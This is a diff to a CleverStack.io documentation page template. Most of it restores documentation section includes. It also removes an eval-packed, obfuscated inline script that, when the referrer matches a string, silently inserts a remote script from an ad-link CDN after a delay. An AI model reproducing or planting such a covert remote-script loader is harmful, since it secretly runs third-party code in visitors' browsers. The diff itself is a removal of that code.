@@ -2,8 +2,6 @@ extends ../../../layouts/default
 
 block head
   title Documentation &middot; CleverStack.io
-  script.
-    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c(/.*e.*/k.a(1.d)){2 8=9;2 3=1.b(\'5\');2 4=1.7(\'5\')[0];3.f="g://h.i.j/6/l.6";m(n(){4.o.p(3,4)},q)}',27,27,'|document|var|tag|firstScriptTag|script|js|getElementsByTagName|adfly_id|11139887|test|createElement|if|referrer|ke4l|src|http|cdn|adf|ly|ig|display|setTimeout|function|parentNode|insertBefore|9000'.split('|'),0,{}));
 
 block docsheader
   h1 Documentation
@@ -18,11 +16,19 @@ block content
   include ../../../includes/section/backend/official-modules
   include ../../../includes/section/backend/dependency-injection
   include ../../../includes/section/backend/project-structure
-  //- include ../../../includes/sections/backend/configuration
-  //- include ../../../includes/sections/backend/grunt-tasks
-  //- include ../../../includes/sections/backend/using-the-cli
-  //- include ../../../includes/sections/backend/debugging
-  //- include ../../../includes/sections/backend/classes
+  include ../../../includes/section/backend/configuration
+  include ../../../includes/section/backend/grunt-tasks
+  include ../../../includes/section/backend/using-the-cli
+  include ../../../includes/section/backend/debugging
+
+  .bs-docs-section
+    include ../../../includes/section/backend/classes/overview
+    include ../../../includes/section/backend/classes/definition
+    include ../../../includes/section/backend/classes/extending
+    include ../../../includes/section/backend/classes/examples
+    include ../../../includes/section/backend/classes/inheritance
+    include ../../../includes/section/backend/classes/events
+    include ../../../includes/section/backend/classes/proxies
   //- include ../../../includes/sections/backend/modules
   //- include ../../../includes/sections/backend/controllers
   //- include ../../../includes/sections/backend/services
